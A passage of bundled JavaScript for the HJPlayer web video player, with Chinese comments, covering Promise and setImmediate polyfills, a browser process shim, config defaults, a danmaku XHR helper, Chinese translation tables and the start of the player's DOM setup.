					const defaultImmediateFn = setTimeout;
					// ===== Promise 原型方法 =====
					/**
					 * 捕获 Promise 拒绝状态的回调（语法糖，等价于 then(null, onRejected)）
					 * @param {Function} onRejected 拒绝回调
					 * @returns {Promise} 新的 Promise 实例
					 */
					Promise.prototype.catch = function(onRejected) {
						return this.then(null, onRejected);
					};
					/**
					 * 注册 Promise 完成/拒绝状态的回调
					 * @param {Function|null} onFulfilled 完成回调
					 * @param {Function|null} onRejected 拒绝回调
					 * @returns {Promise} 新的 Promise 实例
					 */
					Promise.prototype.then = function(onFulfilled, onRejected) {
						const newPromise = new this.constructor(noop);
						handlePromiseCallback(this, new PromiseDeferred(onFulfilled, onRejected,
							newPromise));
						return newPromise;
					};
					// ===== Promise 静态方法 =====
					/**
					 * 所有 Promise 都完成后才完成，任一拒绝则立即拒绝
					 * @param {Array} promiseArray Promise 数组
					 * @returns {Promise} 新的 Promise 实例
					 * @throws {TypeError} 传入非数组时抛出异常
					 */
					Promise.all = function(promiseArray) {
						return new Promise(function(resolve, reject) {
							/**
							 * 处理单个 Promise/值
							 * @param {number} index 数组索引
							 * @param {*} value Promise 或普通值
							 */
							function handleArrayItem(index, value) {
								try {
									// 若值是对象/函数，尝试获取 then 方法（兼容 Promise/thenable）
									if (value && (typeof value === 'object' || typeof value ===
											'function')) {
										const thenMethod = value.then;
										if (typeof thenMethod === 'function') {
											return thenMethod.call(
												value,
												function(resolvedValue) {
													handleArrayItem(index, resolvedValue);
												},
												reject
											);
										}
									}
									// 存储普通值，当所有项处理完成后 resolve
									resultArray[index] = value;
									if (--remainingCount === 0) {
										resolve(resultArray);
									}
								} catch (error) {
									reject(error);
								}
							}
							// 验证传入参数是否为数组
							if (!promiseArray || typeof promiseArray.length === 'undefined') {
								throw new TypeError("Promise.all accepts an array");
							}
							// 转换为数组（兼容类数组对象）
							const resultArray = Array.prototype.slice.call(promiseArray);
							// 空数组直接 resolve
							if (resultArray.length === 0) {
								return resolve([]);
							}
							let remainingCount = resultArray.length;
							// 遍历处理所有数组项
							for (let i = 0; i < resultArray.length; i++) {
								handleArrayItem(i, resultArray[i]);
							}
						});
					};
					/**
					 * 返回一个已完成的 Promise（若传入的是 Promise 则直接返回）
					 * @param {*} value 解析值
					 * @returns {Promise} 已完成的 Promise 实例
					 */
					Promise.resolve = function(value) {
						// 若传入的是 Promise 实例，直接返回
						if (value && typeof value === 'object' && value.constructor === Promise) {
							return value;
						}
						// 否则返回一个新的已完成 Promise
						return new Promise(function(resolve) {
							resolve(value);
						});
					};
					/**
					 * 返回一个已拒绝的 Promise
					 * @param {*} reason 拒绝原因
					 * @returns {Promise} 已拒绝的 Promise 实例
					 */
					Promise.reject = function(reason) {
						return new Promise(function(resolve, reject) {
							reject(reason);
						});
					};
					/**
					 * 竞速模式：第一个完成/拒绝的 Promise 决定最终状态
					 * @param {Array} promiseArray Promise 数组
					 * @returns {Promise} 新的 Promise 实例
					 */
					Promise.race = function(promiseArray) {
						return new Promise(function(resolve, reject) {
							// 遍历所有 Promise，第一个触发状态变更的会决定结果
							for (let i = 0, len = promiseArray.length; i < len; i++) {
								promiseArray[i].then(resolve, reject);
							}
						});
					};
					// ===== Promise 内部配置 =====
					/**
					 * 异步执行函数（优先使用 setImmediate，降级为 setTimeout）
					 * @type {Function}
					 */
					Promise._immediateFn = typeof setImmediateFunc === 'function' ?
						function(callback) {
							setImmediateFunc(callback);
						} :
						function(callback) {
							defaultImmediateFn(callback, 0);
						};
					/**
					 * 未处理拒绝回调（输出警告到控制台）
					 * @type {Function}
					 */
					Promise._unhandledRejectionFn = function(reason) {
						if (typeof console !== 'undefined' && console && console.warn) {
							console.warn("Possible Unhandled Promise Rejection:", reason);
						}
					};
					// 导出 Promise 构造函数
					exports.exports = Promise;
				}).call(module, require(9).setImmediate);
			},
			function(e, t, n) {
				// 定义定时器实例类，用于封装定时器ID和清除函数
				class TimerInstance {
					/**
					 * 构造函数
					 * @param {number} timerId - 原生定时器返回的ID
					 * @param {Function} clearFunction - 对应的清除定时器函数（clearTimeout/clearInterval）
					 */
					constructor(timerId, clearFunction) {
						this._id = timerId;
						this._clearFn = clearFunction;
					}
					// 空方法，保持原代码接口一致性（unref方法，Node.js定时器相关兼容接口）
					unref() {}
					// 空方法，保持原代码接口一致性（ref方法，Node.js定时器相关兼容接口）
					ref() {}
					// 关闭定时器，执行对应的清除函数
					close() {
						this._clearFn.call(window, this._id);
					}
				}
				// 缓存Function原型上的apply方法，避免重复查找
				const originalApply = Function.prototype.apply;
				// 重写setTimeout，返回自定义TimerInstance实例
				t.setTimeout = function() {
					const nativeTimerId = originalApply.call(setTimeout, window, arguments);
					return new TimerInstance(nativeTimerId, clearTimeout);
				};
				// 重写setInterval，返回自定义TimerInstance实例
				t.setInterval = function() {
					const nativeTimerId = originalApply.call(setInterval, window, arguments);
					return new TimerInstance(nativeTimerId, clearInterval);
				};
				// 统一重写clearTimeout和clearInterval，调用自定义实例的close方法
				t.clearTimeout = t.clearInterval = function(timerInstance) {
					// 非空判断，避免调用不存在的close方法
					if (timerInstance) {
						timerInstance.close();
					}
				};
				/**
				 * 注册空闲定时器
				 * @param {Object} target - 目标对象
				 * @param {number} timeout - 空闲超时时间
				 */
				t.enroll = function(target, timeout) {
					clearTimeout(target._idleTimeoutId);
					target._idleTimeout = timeout;
				};
				/**
				 * 取消空闲定时器注册
				 * @param {Object} target - 目标对象
				 */
				t.unenroll = function(target) {
					clearTimeout(target._idleTimeoutId);
					target._idleTimeout = -1;
				};
				/**
				 * 激活/取消引用空闲定时器（两个接口复用同一逻辑，保持原代码一致性）
				 * @param {Object} target - 目标对象
				 */
				t._unrefActive = t.active = function(target) {
					clearTimeout(target._idleTimeoutId);
					const idleTimeout = target._idleTimeout;
					// 仅当超时时间大于等于0时，创建新的定时器
					if (idleTimeout >= 0) {
						target._idleTimeoutId = setTimeout(function() {
							// 若目标对象存在_onTimeout方法，则执行
							if (target._onTimeout) {
								target._onTimeout();
							}
						}, idleTimeout);
					}
				};
				// 执行模块加载（原代码的n(10)，保持不变）
				n(10);
				// 挂载原生setImmediate和clearImmediate到t对象上
				t.setImmediate = setImmediate;
				t.clearImmediate = clearImmediate;
			},
			// 核心：在不支持 setImmediate 的环境下模拟该 API，提供异步立即执行回调能力
			function(e, t, n) {
				// 立即执行核心逻辑（合并原嵌套函数与工具函数）
				(function(global, t) {
					// 仅在环境不支持 setImmediate 时执行兼容逻辑
					if (global.setImmediate) return;
					// 核心状态变量（语义化命名，替代原单字母变量）
					let callbackId = 1; // 回调唯一ID，自增起始值
					const callbackMap = {}; // 存储回调信息：{ id: { callback: 函数, args: 参数数组 } }
					let isExecuting = false; // 标记是否正在执行回调，防止重入
					const doc = global.document; // IE浏览器兼容所需文档对象
					let nextTickHandler; // 回调调度处理器
					// -------------- 内部核心工具函数（全部内聚在当前函数内）--------------
					/**
					 * 新增立即执行回调（对应原 i 函数，polyfill 的 setImmediate 实现）
					 */
					function addImmediateCallback(callback) {
						// 兼容字符串参数，转为 Function 实例
						if (typeof callback !== 'function') {
							callback = new Function('' + callback);
						}
						// 收集除回调外的所有参数
						const callbackArgs = Array.prototype.slice.call(arguments, 1);
						// 存储回调信息并调度执行
						const callbackInfo = {
							callback,
							args: callbackArgs
						};
						callbackMap[callbackId] = callbackInfo;
						nextTickHandler(callbackId);
						const currentId = callbackId;
						callbackId++;
						return currentId;
					}
					/**
					 * 清除指定ID的回调（对应原 a 函数，polyfill 的 clearImmediate 实现）
					 */
					function removeImmediateCallback(id) {
						delete callbackMap[id];
					}
					/**
					 * 执行单个回调（对应原 o 函数，优化参数传递性能）
					 */
					function executeCallback(callbackInfo) {
						const {
							callback,
							args
						} = callbackInfo;
						const argsLength = args.length;
						// 按参数长度优化调用，减少 apply 性能损耗
						switch (argsLength) {
							case 0:
								callback();
								break;
							case 1:
								callback(args[0]);
								break;
							case 2:
								callback(args[0], args[1]);
								break;
							case 3:
								callback(args[0], args[1], args[2]);
								break;
							default:
								callback.apply(global, args);
						}
					}
					/**
					 * 安全执行回调（对应原 s 函数，防止执行重入）
					 */
					function safeExecuteCallback(id) {
						if (isExecuting) {
							setTimeout(() => safeExecuteCallback(id), 0);
							return;
						}
						const callbackInfo = callbackMap[id];
						if (!callbackInfo) return;
						try {
							isExecuting = true;
							executeCallback(callbackInfo);
						} finally {
							removeImmediateCallback(id);
							isExecuting = false;
						}
					}
					// -------------- 环境判断与调度器初始化（按优先级兼容）--------------
					// 获取全局对象原型，用于挂载 API
					const globalProto = (Object.getPrototypeOf && Object.getPrototypeOf(global)) || global;
					const targetGlobal = (globalProto && globalProto.setTimeout) ? globalProto : global;
					// 1. Node.js 环境：使用 process.nextTick
					if (Object.prototype.toString.call(global.process) === "[object process]") {
						nextTickHandler = function(id) {
							t.nextTick(() => safeExecuteCallback(id));
						};
					}
					// 2. 浏览器环境（支持 postMessage 且非 Web Worker）
					else if (global.postMessage && !global.importScripts) {
						let isPostMessageUsable = true;
						const originalOnMessage = global.onmessage;
						global.onmessage = () => {
							isPostMessageUsable = false;
						};
						global.postMessage("", "*");
						global.onmessage = originalOnMessage;

						if (isPostMessageUsable) {
							const messagePrefix = "setImmediate$" + Math.random() + "$";
							const messageHandler = function(e) {
								if (e.source === global && typeof e.data === "string" && e.data.indexOf(
										messagePrefix) === 0) {
									const id = +e.data.slice(messagePrefix.length);
									safeExecuteCallback(id);
								}
							};
							if (global.addEventListener) {
								global.addEventListener("message", messageHandler, false);
							} else {
								global.attachEvent("onmessage", messageHandler);
							}
							nextTickHandler = function(id) {
								global.postMessage(messagePrefix + id, "*");
							};
						}
					}
					// 3. 现代浏览器：使用 MessageChannel
					else if (global.MessageChannel) {
						const channel = new MessageChannel();
						channel.port1.onmessage = function(e) {
							safeExecuteCallback(e.data);
						};
						nextTickHandler = function(id) {
							channel.port2.postMessage(id);
						};
					}
					// 4. IE 浏览器：使用 script 标签 onreadystatechange
					else if (doc && "onreadystatechange" in doc.createElement("script")) {
						const docElement = doc.documentElement;
						nextTickHandler = function(id) {
							const script = doc.createElement("script");
							script.onreadystatechange = function() {
								safeExecuteCallback(id);
								script.onreadystatechange = null;
								docElement.removeChild(script);
							};
							docElement.appendChild(script);
						};
					}
					// 5. 最低兼容：使用 setTimeout 0
					else {
						nextTickHandler = function(id) {
							setTimeout(() => safeExecuteCallback(id), 0);
						};
					}
					// -------------- 挂载 API 到全局对象 --------------
					targetGlobal.setImmediate = addImmediateCallback;
					targetGlobal.clearImmediate = removeImmediateCallback;
					// 传入全局对象（兼容浏览器/Node.js）和透传参数
				}).call(t, (typeof self !== "undefined") ? self : (typeof e !== "undefined" ? e : undefined), n(
					1), n(11));
			},
			function(e, t, n) {
				// 异常抛出函数：setTimeout 未定义时的错误
				function throwSetTimeoutUndefinedError() {
					throw new Error("setTimeout has not been defined");
				}
				// 异常抛出函数：clearTimeout 未定义时的错误
				function throwClearTimeoutUndefinedError() {
					throw new Error("clearTimeout has not been defined");
				}
				// 安全执行 setTimeout（兼容不同调用方式）
				function safeSetTimeout(callback) {
					// 若已指向原生 setTimeout，直接调用
					if (timeoutFunc === setTimeout) {
						return setTimeout(callback, 0);
					}
					// 若 timeoutFunc 未初始化或为异常函数，且原生 setTimeout 存在，先初始化
					if ((timeoutFunc === throwSetTimeoutUndefinedError || !timeoutFunc) && setTimeout) {
						timeoutFunc = setTimeout;
						return setTimeout(callback, 0);
					}
					// 尝试多种调用方式兼容不同环境
					try {
						return timeoutFunc(callback, 0);
					} catch (error) {
						try {
							return timeoutFunc.call(null, callback, 0);
						} catch (error) {
							return timeoutFunc.call(this, callback, 0);
						}
					}
				}
				// 安全执行 clearTimeout（兼容不同调用方式）
				function safeClearTimeout(timeoutId) {
					// 若已指向原生 clearTimeout，直接调用
					if (clearTimeoutFunc === clearTimeout) {
						return clearTimeout(timeoutId);
					}
					// 若 clearTimeoutFunc 未初始化或为异常函数，且原生 clearTimeout 存在，先初始化
					if ((clearTimeoutFunc === throwClearTimeoutUndefinedError || !clearTimeoutFunc) &&
						clearTimeout) {
						clearTimeoutFunc = clearTimeout;
						return clearTimeout(timeoutId);
					}
					// 尝试多种调用方式兼容不同环境
					try {
						return clearTimeoutFunc(timeoutId);
					} catch (error) {
						try {
							return clearTimeoutFunc.call(null, timeoutId);
						} catch (error) {
							return clearTimeoutFunc.call(this, timeoutId);
						}
					}
				}
				// 批量执行回调队列的后续逻辑（重置状态 + 处理剩余回调）
				function flushCallbackQueue() {
					// 若处于执行中且存在待处理回调队列，执行后续逻辑
					if (isFlushing && pendingCallbacks) {
						isFlushing = false;
						// 合并待处理回调到主队列
						if (pendingCallbacks.length) {
							callbackQueue = pendingCallbacks.concat(callbackQueue);
						} else {
							currentIndex = -1;
						}
						// 若主队列还有回调，继续执行
						if (callbackQueue.length) {
							processCallbacks();
						}
					}
				}
				// 处理并执行回调队列中的所有回调
				function processCallbacks() {
					if (!isFlushing) {
						// 先通过 safeSetTimeout 注册 flush 函数，保证异步执行
						const timeoutId = safeSetTimeout(flushCallbackQueue);
						isFlushing = true;
						let queueLength = callbackQueue.length;
						// 循环处理回调队列（支持执行过程中新增的回调）
						while (queueLength) {
							pendingCallbacks = callbackQueue;
							callbackQueue = [];
							// 执行当前批次的所有回调
							for (currentIndex++; currentIndex < queueLength; currentIndex++) {
								if (pendingCallbacks && pendingCallbacks[currentIndex]) {
									pendingCallbacks[currentIndex].run();
								}
							}
							// 重置索引，更新队列长度（处理新增的回调）
							currentIndex = -1;
							queueLength = callbackQueue.length;
						}
						// 清理状态，取消定时器
						pendingCallbacks = null;
						isFlushing = false;
						safeClearTimeout(timeoutId);
					}
				}
				// 回调包装类：存储回调函数和参数数组
				class CallbackWrapper {
					constructor(func, argsArray) {
						this.fun = func;
						this.array = argsArray;
					}
					// 执行回调函数（绑定 null 作为 this，传递参数数组）
					run() {
						this.fun.apply(null, this.array);
					}
				}
				// 空函数：用于绑定各类无效的事件监听方法
				function noop() {}
				// 核心导出对象（对应原 process 对象）
				let timeoutFunc;
				let clearTimeoutFunc;
				const exportsObj = e.exports = {};
				// 初始化 timeoutFunc 和 clearTimeoutFunc（兼容环境判断）
				(function initTimeoutFunctions() {
					try {
						// 优先使用原生 setTimeout，否则使用异常抛出函数
						timeoutFunc = typeof setTimeout === "function" ? setTimeout :
							throwSetTimeoutUndefinedError;
					} catch (error) {
						timeoutFunc = throwSetTimeoutUndefinedError;
					}
					try {
						// 优先使用原生 clearTimeout，否则使用异常抛出函数
						clearTimeoutFunc = typeof clearTimeout === "function" ? clearTimeout :
							throwClearTimeoutUndefinedError;
					} catch (error) {
						clearTimeoutFunc = throwClearTimeoutUndefinedError;
					}
				})();
				// 回调队列相关变量
				let pendingCallbacks = null; // 待处理回调队列
				let callbackQueue = []; // 主回调队列
				let isFlushing = false; // 是否正在执行回调队列
				let currentIndex = -1; // 回调执行索引
				// 实现 nextTick 方法（核心功能：异步执行回调）
				exportsObj.nextTick = function(callback) {
					// 收集除第一个参数外的其他参数作为回调参数
					const args = new Array(arguments.length - 1);
					if (arguments.length > 1) {
						for (let i = 1; i < arguments.length; i++) {
							args[i - 1] = arguments[i];
						}
					}
					// 将回调包装后加入主队列
					callbackQueue.push(new CallbackWrapper(callback, args));
					// 若当前是队列第一个回调，且未在执行中，触发回调处理
					if (callbackQueue.length !== 1 || isFlushing) {
						return;
					}
					safeSetTimeout(processCallbacks);
				};
				// 环境标识及无效方法挂载（模拟 node process 接口，浏览器环境下无效）
				exportsObj.title = "browser";
				exportsObj.browser = true;
				exportsObj.env = {};
				exportsObj.argv = [];
				exportsObj.version = "";
				exportsObj.versions = {};
				exportsObj.on = noop;
				exportsObj.addListener = noop;
				exportsObj.once = noop;
				exportsObj.off = noop;
				exportsObj.removeListener = noop;
				exportsObj.removeAllListeners = noop;
				exportsObj.emit = noop;
				exportsObj.prependListener = noop;
				exportsObj.prependOnceListener = noop;
				exportsObj.listeners = function(event) {
					return [];
				};
				exportsObj.binding = function(name) {
					throw new Error("process.binding is not supported");
				};
				exportsObj.cwd = function() {
					return "/";
				};
				exportsObj.chdir = function(path) {
					throw new Error("process.chdir is not supported");
				};
				exportsObj.umask = function() {
					return 0;
				};
			},
			/**
			 * 播放器配置合并与标准化工具
			 * 功能：为播放器补充默认配置，并对传入配置进行格式规范化处理
			 * @param {Object} externalModule - 模块加载相关依赖（原代码 e，无实际业务作用，保留以兼容原功能）
			 * @param {Object} moduleExports - 模块导出对象（原代码 t，用于挂载导出内容）
			 * @param {Function} requireModule - 模块引入函数（原代码 n，用于加载依赖模块）
			 */
			function initPlayerConfigModule(externalModule, moduleExports, requireModule) {
				// 标记为 ES 模块（兼容 ES Module 与 CommonJS 互操作）
				Object.defineProperty(moduleExports, '__esModule', {
					value: true
				});
				/**
				 * 增强型类型判断函数
				 * 修复原生 typeof 对 Symbol 类型的判断缺陷
				 * @param {*} value - 待判断类型的值
				 * @returns {string} 精准的类型字符串（如 "symbol"、"object" 等）
				 */
				function getPreciseType(value) {
					// 支持 Symbol 环境下的精准判断
					if (typeof Symbol === 'function' && typeof Symbol.iterator === 'symbol') {
						return typeof value;
					}
					// 非 Symbol 环境下，兼容 Symbol 实例的判断
					return (value && typeof Symbol === 'function' && value.constructor === Symbol && value !==
							Symbol.prototype) ?
						'symbol' :
						typeof value;
				}
				// 引入 13 号模块并处理模块导出格式（兼容 ES Module 默认导出）
				const apiBackendModule = requireModule(13);
				/**
				 * 统一模块导出格式
				 * 若为 ES 模块则直接返回，否则包装为 { default: 模块内容 } 格式
				 * @param {*} module - 待处理的模块
				 * @returns {Object} 标准化后的模块对象
				 */
				function normalizeModuleExport(module) {
					return module && module.__esModule ? module : {
						default: module
					};
				}
				const normalizedApiBackend = normalizeModuleExport(apiBackendModule);
				/**
				 * 播放器配置合并核心方法
				 * @param {Object} userConfig - 用户传入的自定义配置
				 * @returns {Object} 合并默认配置并标准化后的最终配置
				 */
				moduleExports.default = function mergePlayerConfig(userConfig) {
					// 播放器默认配置项
					const defaultConfig = {
						container: userConfig.element || document.getElementsByClassName('hjplayer')[0],
						live: false,
						autoplay: false,
						theme: '#b7daff',
						loop: false,
						lang: (navigator.language || navigator.browserLanguage).toLowerCase(),
						screenshot: false,
						hotkey: true,
						preload: 'auto',
						volume: 0.7,
						apiBackend: normalizedApiBackend.default,
						video: {},
						contextmenu: [],
						mutex: true
					};
					// 补充默认配置：用户未传入的配置项，从默认配置中继承
					for (const configKey in defaultConfig) {
						// 仅处理默认配置自身的属性（排除原型链属性）
						if (defaultConfig.hasOwnProperty(configKey) && !userConfig.hasOwnProperty(
								configKey)) {
							userConfig[configKey] = defaultConfig[configKey];
						}
					}
					// 视频配置标准化：未指定视频类型时，默认设为 "auto"
					if (userConfig.video && !userConfig.video.type) {
						userConfig.video.type = 'auto';
					}
					// 弹幕配置标准化：未指定用户信息时，默认设为 "DIYgod"
					if (getPreciseType(userConfig.danmaku) === 'object' && userConfig.danmaku && !userConfig
						.danmaku.user) {
						userConfig.danmaku.user = 'DIYgod';
					}
					// 字幕配置标准化：补充字幕默认属性
					if (userConfig.subtitle) {
						if (!userConfig.subtitle.type) userConfig.subtitle.type = 'webvtt';
						if (!userConfig.subtitle.fontSize) userConfig.subtitle.fontSize = '20px';
						if (!userConfig.subtitle.bottom) userConfig.subtitle.bottom = '40px';
						if (!userConfig.subtitle.color) userConfig.subtitle.color = '#fff';
					}
					// 视频质量配置标准化：将指定质量的 URL 赋值给 video.url
					if (userConfig.video.quality) {
						userConfig.video.url = [
							userConfig.video.quality[userConfig.video.defaultQuality].url
						];
					}
					// 语言配置标准化：强制转为小写
					if (userConfig.lang) {
						userConfig.lang = userConfig.lang.toLowerCase();
					}
					// 右键菜单配置：追加默认菜单项（保持用户原有菜单不变，仅新增）
					userConfig.contextmenu = userConfig.contextmenu.concat([{
							text: '视频信息',
							click: function(playerInstance) {
								playerInstance.infoPanel
									.triggle(); // 注：原代码 "triggle" 疑似笔误（应为 trigger），保留原功能未修改
							}
						},
						{
							text: 'HJPlayer'
						}
					]);
					// 返回最终处理后的配置
					return userConfig;
				};
			},
			function(e, t, n) {
				// 标记为 ES 模块（保持原有功能，兼容模块加载器）
				Object.defineProperty(t, "__esModule", {
					value: true
				});
				/**
				 * 封装 AJAX 请求核心方法
				 * @param {string} url - 请求地址
				 * @param {Object|null} data - POST 请求时的提交数据（null 则为 GET 请求）
				 * @param {Function} successCode23Callback - 接口返回 code=23 时的回调函数
				 * @param {Function} successOtherCodeCallback - 接口返回 code≠23 时的回调函数
				 * @param {Function} errorCallback - 请求失败（状态码异常）时的回调函数
				 */
				const ajaxRequest = function(url, data, successCode23Callback, successOtherCodeCallback,
					errorCallback) {
					// 创建 XMLHttpRequest 实例
					const xhr = new XMLHttpRequest();
					// 监听请求状态变化
					xhr.onreadystatechange = function() {
						// 仅处理请求完成的状态（readyState=4）
						if (xhr.readyState === 4) {
							// 判断 HTTP 状态码是否成功
							const isHttpSuccess = (xhr.status >= 200 && xhr.status < 300) || xhr
								.status === 304;
							if (isHttpSuccess) {
								// 解析 JSON 响应数据
								const responseData = JSON.parse(xhr.responseText);
								// 根据接口 code 值分发到对应成功回调
								if (responseData.code === 23) {
									successCode23Callback(xhr, responseData);
								} else {
									successOtherCodeCallback(xhr, responseData);
								}
							} else {
								// HTTP 状态码异常，执行失败回调
								errorCallback(xhr);
							}
						}
					};
					// 确定请求方法（有数据为 POST，无数据为 GET）
					const method = data !== null ? "POST" : "GET";
					// 打开请求（异步请求：第三个参数为 true）
					xhr.open(method, url, true);
					// 发送请求（POST 需序列化 JSON 数据，GET 发送 null）
					xhr.send(data !== null ? JSON.stringify(data) : null);
				};
				// 暴露默认导出对象，包含 send 和 read 两个方法（保持原有接口一致）
				t.default = {
					/**
					 * 发送弹幕请求
					 * @param {string} url - 请求地址
					 * @param {Object} data - 弹幕提交数据
					 * @param {Function|null} callback - 发送成功后的回调函数（可选）
					 */
					send: function(url, data, callback) {
						ajaxRequest(
							url,
							data,
							// code=23 回调：发送成功
							function(xhr, responseData) {
								console.log("发送弹幕成功");
								// 存在回调则执行回调
								if (callback) {
									callback();
								}
							},
							// code≠23 回调：接口业务异常
							function(xhr, responseData) {
								alert(responseData.msg);
							},
							// HTTP 请求失败回调
							function(xhr) {
								console.log("Request was unsuccessful: " + xhr.status);
							}
						);
					},
					/**
					 * 读取弹幕请求
					 * @param {string} url - 请求地址
					 * @param {Function} callback - 读取完成后的回调函数（携带错误/数据）
					 */
					read: function(url, callback) {
						ajaxRequest(
							url,
							null, // 无数据，使用 GET 请求
							// code=23 回调：读取成功，返回弹幕数据
							function(xhr, responseData) {
								callback(null, responseData.danmuku);
							},
							// code≠23 回调：接口业务异常，返回错误信息
							function(xhr, responseData) {
								callback({
									status: xhr.status,
									response: responseData
								});
							},
							// HTTP 请求失败回调：返回错误信息
							function(xhr) {
								callback({
									status: xhr.status,
									response: null
								});
							}
						);
					}
				};
			},
			function(e, t, n) {
				// 1. 定义国际化翻译字典（内部常量，不暴露）
				const translationDict = {
					"zh-cn": {
						"Danmaku is loading": "弹幕加载中",
						Top: "顶部",
						Bottom: "底部",
						Rolling: "滚动",
						"Input danmaku, hit Enter": "发个弹幕见证当下",
						"About author": "关于作者",
						"hjplayer feedback": "播放器意见反馈",
						"About hjplayer": "关于 hjplayer 播放器",
						Loop: "洗脑循环",
						Speed: "速度",
						"Opacity for danmaku": "弹幕透明度",
						Normal: "正常",
						"Please input danmaku content!": "要输入弹幕内容啊喂！",
						"Set danmaku color": "弹幕颜色",
						"Set danmaku type": "弹幕模式",
						"Show danmaku": "显示弹幕",
						"This video fails to load": "视频加载失败",
						"Switching to": "正在切换至",
						"Switched to": "已经切换至",
						quality: "画质",
						FF: "快进",
						REW: "快退",
						"Unlimited danmaku": "海量弹幕",
						"Send danmaku": "发送弹幕",
						Setting: "设置",
						"Full screen": "全屏",
						"Web full screen": "页面全屏",
						Send: "发送",
						Screenshot: "截图",
						s: "秒",
						"Show subtitle": "显示字幕",
						"Hide subtitle": "隐藏字幕",
						Volume: "音量",
						Live: "直播",
						"Video info": "视频统计信息"
					},
					"zh-tw": {
						"Danmaku is loading": "彈幕加載中",
						Top: "頂部",
						Bottom: "底部",
						Rolling: "滾動",
						"Input danmaku, hit Enter": "輸入彈幕，Enter 發送",
						"About author": "關於作者",
						"hjplayer feedback": "播放器意見反饋",
						"About hjplayer": "關於 hjplayer 播放器",
						Loop: "循環播放",
						Speed: "速度",
						"Opacity for danmaku": "彈幕透明度",
						Normal: "正常",
						"Please input danmaku content!": "請輸入彈幕内容啊！",
						"Set danmaku color": "設置彈幕顏色",
						"Set danmaku type": "設置彈幕類型",
						"Show danmaku": "顯示彈幕",
						"This video fails to load": "視頻加載失敗",
						"Switching to": "正在切換至",
						"Switched to": "已經切換至",
						quality: "畫質",
						FF: "快進",
						REW: "快退",
						"Unlimited danmaku": "海量彈幕",
						"Send danmaku": "發送彈幕",
						Setting: "設置",
						"Full screen": "全屏",
						"Web full screen": "頁面全屏",
						Send: "發送",
						Screenshot: "截圖",
						s: "秒",
						"Show subtitle": "顯示字幕",
						"Hide subtitle": "隱藏字幕",
						Volume: "音量",
						Live: "直播",
						"Video info": "視頻統計信息"
					}
				};
				// 2. 翻译类（修复 this 指向问题，双重保障）
				class Translator {
					constructor(lang) {
						this.lang = lang;
						// 修复方案1：手动绑定 this 到 tran 方法，避免丢失
						this.tran = this.tran.bind(this);
					}
					// 修复方案2：方法内增加安全判断，避免 this 为 undefined 时报错
					tran(key) {
						// 先判断 this 是否存在，再读取 lang，兜底保障
						if (!this || !this.lang) {
							return key;
						}
						const langDict = translationDict[this.lang];
						return langDict && langDict[key] ? langDict[key] : key;
					}
				}
				// 兼容 ES 模块标识
				Object.defineProperty(t, "__esModule", {
					value: true
				});
				// 导出默认翻译类（与原代码功能完全一致）
				t.default = Translator;
			},
			function(e, t, n) {
				// 1. 兼容非 ES Module 模块的导入处理
				const normalizeModuleExport = (module) => {
					return module && module.__esModule ? module : {
						default: module
					};
				};
				// 2. 类调用校验：禁止将类作为普通函数调用
				const validateClassInvocation = (instance, Constructor) => {
					if (!(instance instanceof Constructor)) {
						throw new TypeError("Cannot call a class as a function");
					}
				};
				// 3. 类属性定义辅助函数
				const defineClassProperties = (target, properties) => {
					for (let i = 0; i < properties.length; i++) {
						const prop = properties[i];
						prop.enumerable = prop.enumerable || false;
						prop.configurable = true;
						if ("value" in prop) {
							prop.writable = true;
						}
						Object.defineProperty(target, prop.key, prop);
					}
				};
				// 4. 类装饰器：用于定义类的原型属性和静态属性
				const classDecorator = (Constructor, protoProps, staticProps) => {
					if (protoProps) {
						defineClassProperties(Constructor.prototype, protoProps);
					}
					if (staticProps) {
						defineClassProperties(Constructor, staticProps);
					}
					return Constructor;
				};
				// 5. 模块导出标记
				Object.defineProperty(t, "__esModule", {
					value: true
				});
				// 6. 导入外部模块并进行规范化处理
				const iconsModule = normalizeModuleExport(n(2));
				const templateModule = normalizeModuleExport(n(32));
				// 7. 播放器核心类
				class HjPlayer {
					/**
					 * 构造函数
					 * @param {Object} options - 播放器初始化配置
					 * @param {HTMLElement} options.container - 播放器容器元素
					 * @param {Object} options.options - 播放器核心配置项
					 * @param {number} options.index - 播放器索引
					 * @param {*} options.tran - 过渡/转换相关参数
					 */
					constructor(options) {
						// 校验类调用方式
						validateClassInvocation(this, HjPlayer);
						// 初始化实例属性
						this.container = options.container;
						this.playerOptions = options.options;
						this.index = options.index;
						this.tran = options.tran;
						// 执行初始化逻辑
						this.init();
					}
					/**
					 * 初始化方法：渲染模板并获取所有DOM元素引用
					 */
					init() {
						// 渲染播放器模板
						this.container.innerHTML = templateModule.default({
							options: this.playerOptions,
							index: this.index,
							tran: this.tran,
							icons: iconsModule.default,
							video: {
								current: true,
								pic: this.playerOptions.video.pic,
								screenshot: this.playerOptions.screenshot,
								preload: this.playerOptions.preload,
								url: this.playerOptions.video.url,
								subtitle: this.playerOptions.video.subtitle
							}
						});
						// ========== 音量相关DOM元素 ==========
						this.volumeBar = this.container.querySelector(".hjplayer-volume-bar-inner");
						this.volumeBarWrap = this.container.querySelector(".hjplayer-volume-bar");
						this.volumeBarWrapWrap = this.container.querySelector(".hjplayer-volume-bar-wrap");
						this.volumeButton = this.container.querySelector(".hjplayer-volume");
						this.volumeIcon = this.container.querySelector(
							".hjplayer-volume-icon .hjplayer-icon-content");
						// ========== 进度条相关DOM元素 ==========
						this.playedBar = this.container.querySelector(".hjplayer-played");
						this.loadedBar = this.container.querySelector(".hjplayer-loaded");
						this.playedBarWrap = this.container.querySelector(".hjplayer-bar-wrap");
						this.playedBarTime = this.container.querySelector(".hjplayer-bar-time");
						this.barPreview = this.container.querySelector(".hjplayer-bar-preview");
						this.barWrap = this.container.querySelector(".hjplayer-bar-wrap");
						// ========== 弹幕相关DOM元素 ==========
						this.danmaku = this.container.querySelector(".hjplayer-danmaku");
						this.danmakuLoading = this.container.querySelector(".hjplayer-danloading");
						this.danmakuOpacityBar = this.container.querySelector(
							".hjplayer-danmaku-bar-inner");
						this.danmakuOpacityBarWrap = this.container.querySelector(".hjplayer-danmaku-bar");
						this.danmakuOpacityBarWrapWrap = this.container.querySelector(
							".hjplayer-danmaku-bar-wrap");
						this.danmakuOpacityBox = this.container.querySelector(".hjplayer-setting-danmaku");
						// ========== 视频核心相关DOM元素 ==========
						this.video = this.container.querySelector(".hjplayer-video-current");
						this.bezel = this.container.querySelector(".hjplayer-bezel-icon");
						this.playButton = this.container.querySelector(".hjplayer-play-icon");
						this.videoWrap = this.container.querySelector(".hjplayer-video-wrap");
						// ========== 控制器相关DOM元素 ==========
